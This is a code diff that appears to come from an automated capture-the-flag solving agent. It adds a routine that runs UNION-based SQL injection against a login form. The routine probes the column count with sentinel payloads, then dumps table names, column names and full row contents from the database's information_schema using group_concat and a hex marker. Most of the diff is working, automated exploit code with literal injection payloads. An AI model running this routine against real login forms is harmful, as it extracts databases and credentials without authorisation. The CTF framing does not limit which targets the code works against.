@@ -52,6 +52,14 @@ _SQLI_AUTH_BYPASS_PAYLOADS = (
     "' or 1=1#",
 )
 
+# UNION-based extraction (LoveSQL-class login forms whose flag lives in a table
+# column, not shown on login). Every dumped value is wrapped in this marker so it
+# can be regex-recovered from any page template regardless of surrounding HTML.
+_SQLI_UNION_MARKER = "<<FHU>>"
+_SQLI_UNION_MARKER_HEX = "0x3c3c4648553e3e"  # hex("<<FHU>>")
+_SQLI_UNION_MAX_COLUMNS = 8
+_SQLI_UNION_SENTINEL_BASE = 918200  # distinctive ints unlikely to occur naturally
+
 
 class SQLiExecutorMixin:
     """Unicode/auth/sqlmap/generic SQLi strategies and the local-challenge log pivot."""
@@ -248,10 +256,15 @@ class SQLiExecutorMixin:
                             }
                         ],
                     )
+                    # verified ⇒ unconditional solve; runtime ⇒ short-circuit the
+                    # sequence and surface the flag (blackboard make_goal reads it from
+                    # state.runtime_flags), but mark it unverified so the terminal
+                    # contract routes it to wait_for_verification, not a claimed win.
                     return _ChainOutcome(
                         progress=True,
                         flag=verification.flag,
                         reason="auth form SQLi bypass",
+                        verified=verification.decision == "verified",
                     )
                 if verification.decision == "candidate":
                     progress = True
@@ -275,6 +288,191 @@ class SQLiExecutorMixin:
         if reasons:
             fallback_reason = "; ".join(reasons + [fallback_reason])
         return _ChainOutcome(progress=progress, reason=fallback_reason)
+
+    async def _attempt_auth_form_union_sqli(
+        self,
+        target: str,
+        auth_form: dict[str, Any],
+    ) -> _ChainOutcome:
+        """UNION-based extraction on a login form (LoveSQL-class).
+
+        ``_attempt_auth_form_sqli`` only *logs in* — for challenges whose flag lives
+        in a table column (never shown on the login page) the flag is recovered by a
+        ``UNION SELECT`` that reflects a dumped value into the response. This is the
+        missing POST-login UNION extraction vector: the bypass strategy does login,
+        ``generic_param_sqli`` does GET-form stacked queries (``handler read``), and
+        neither dumps a login form's database via UNION. The live LoveSQL stress run
+        exposed the gap — 24 steps, zero UNION payloads, unsolved.
+
+        Deterministic bounded schema walk: discover the UNION column count and a
+        reflected position, then dump tables -> columns -> row data via
+        ``group_concat``, wrapping every extracted value in a distinctive marker so it
+        can be regex-recovered from any page template. Each blob is flag-scanned; a
+        verified/runtime flag is surfaced exactly like the bypass strategy (returned on
+        "runtime" too, per efd6188), with ``strategy_kind`` set for memory attribution.
+        """
+        self.tool_guard.require(["http_request"])
+        username_field = _pick_form_field(auth_form, "username")
+        password_field = _pick_form_field(auth_form, "password")
+        if not username_field:
+            return _ChainOutcome(
+                progress=False, reason="auth form union: no injectable username field"
+            )
+
+        progress = False
+        reasons: list[str] = []
+
+        async def _submit(payload: str) -> tuple[str, str]:
+            fields = {username_field: payload}
+            if password_field:
+                fields[password_field] = "1"
+            response, url = await self._submit_form_request(target, auth_form, fields)
+            body = str((response or {}).get("body") or "")
+            await self._scan_and_store(body, url, evidence_source="http-response")
+            return body, url
+
+        async def _check_flag(body: str, url: str, note: str) -> _ChainOutcome | None:
+            extracted = self._extract_flag(body)
+            if not extracted:
+                return None
+            verification = await self._observe_flag(
+                extracted,
+                target,
+                evidence_source="http-response",
+                rationale=f"auth form UNION SQLi: {note}",
+                evidence_url=url,
+                evidence_snippet=body[:240],
+                strategy_kind="auth_form_union_sqli",
+            )
+            if verification.decision in {"verified", "runtime"}:
+                await self._store_note(
+                    key="ctf_sqli_union_extract",
+                    value=f"UNION extraction recovered flag via {username_field} ({note})",
+                    category="vulnerability",
+                    target=urlparse(target).netloc or target,
+                    url=url,
+                    weaknesses=[
+                        {
+                            "id": "sqli-union",
+                            "description": "UNION-based SQL injection recovered database contents.",
+                        }
+                    ],
+                )
+                return _ChainOutcome(
+                    progress=True,
+                    flag=verification.flag,
+                    reason="auth form UNION SQLi",
+                    verified=verification.decision == "verified",
+                )
+            return None
+
+        # 1) Column count + reflected positions: grow the SELECT list until the row's
+        #    integer sentinels surface in the response (a correct column count no longer
+        #    errors, and the union row is rendered where the login result would be).
+        columns = 0
+        reflected: list[int] = []
+        for n in range(2, _SQLI_UNION_MAX_COLUMNS + 1):
+            sentinels = [str(_SQLI_UNION_SENTINEL_BASE + i) for i in range(n)]
+            body, _url = await _submit("-1' union select " + ",".join(sentinels) + "#")
+            hit = [i + 1 for i, s in enumerate(sentinels) if s in body]
+            if hit:
+                columns, reflected, progress = n, hit, True
+                reasons.append(f"union column count = {n}, reflected positions {hit}")
+                break
+
+        if not columns or not reflected:
+            return _ChainOutcome(
+                progress=progress,
+                reason="; ".join(reasons + ["auth form union: no reflected UNION column found"]),
+            )
+
+        pos = reflected[0]  # 1-indexed reflected position we hijack for extraction
+
+        def _build(expr: str) -> str:
+            wrapped = f"concat({_SQLI_UNION_MARKER_HEX},({expr}),{_SQLI_UNION_MARKER_HEX})"
+            cells = [
+                wrapped if (i + 1) == pos else str(_SQLI_UNION_SENTINEL_BASE + i)
+                for i in range(columns)
+            ]
+            return "-1' union select " + ",".join(cells) + "#"
+
+        marker = re.escape(_SQLI_UNION_MARKER)
+
+        def _extract_marked(body: str) -> str:
+            match = re.search(marker + r"(.*?)" + marker, body, re.DOTALL)
+            return match.group(1) if match else ""
+
+        # 2) Dump the current database's tables.
+        body, url = await _submit(
+            _build(
+                "select group_concat(table_name) from information_schema.tables "
+                "where table_schema=database()"
+            )
+        )
+        if hit_outcome := await _check_flag(body, url, "table dump"):
+            return hit_outcome
+        tables = [
+            t
+            for t in _extract_marked(body).split(",")
+            if re.fullmatch(r"[A-Za-z0-9_]+", t or "")
+        ]
+        if tables:
+            progress = True
+            reasons.append(f"union dumped tables: {', '.join(tables[:4])}")
+            await self._store_note(
+                key="ctf_sqli_union_tables",
+                value=json.dumps({"tables": tables[:10]}, ensure_ascii=False),
+                category="finding",
+                target=urlparse(target).netloc or target,
+                url=url,
+            )
+
+        def _table_rank(name: str) -> tuple[bool, str]:
+            low = name.lower()
+            interesting = any(
+                tok in low
+                for tok in ("flag", "key", "secret", "love", "user", "ctf", "sql", "geek")
+            )
+            return (not interesting, name)
+
+        # 3+4) Per table: dump its columns, then group_concat all columns of every row
+        #       and flag-scan the blob.
+        for table in sorted(tables, key=_table_rank)[:4]:
+            table_hex = "0x" + table.encode().hex()
+            body, url = await _submit(
+                _build(
+                    "select group_concat(column_name) from information_schema.columns "
+                    f"where table_schema=database() and table_name={table_hex}"
+                )
+            )
+            if hit_outcome := await _check_flag(body, url, f"column dump {table}"):
+                return hit_outcome
+            cols = [
+                c
+                for c in _extract_marked(body).split(",")
+                if re.fullmatch(r"[A-Za-z0-9_]+", c or "")
+            ]
+            if not cols:
+                continue
+            concat_cols = ",".join(
+                f"ifnull({_quote_sql_identifier(c)},0x20)" for c in cols
+            )
+            body, url = await _submit(
+                _build(
+                    f"select group_concat(concat_ws(0x7e,{concat_cols})) "
+                    f"from {_quote_sql_identifier(table)}"
+                )
+            )
+            if hit_outcome := await _check_flag(body, url, f"row dump {table}"):
+                return hit_outcome
+            progress = True
+            reasons.append(f"union dumped rows from {table}")
+
+        fallback = "auth form union: extraction exhausted without flag"
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(reasons + [fallback]) if reasons else fallback,
+        )
 
     async def _attempt_sqlmap_sqli(
         self,
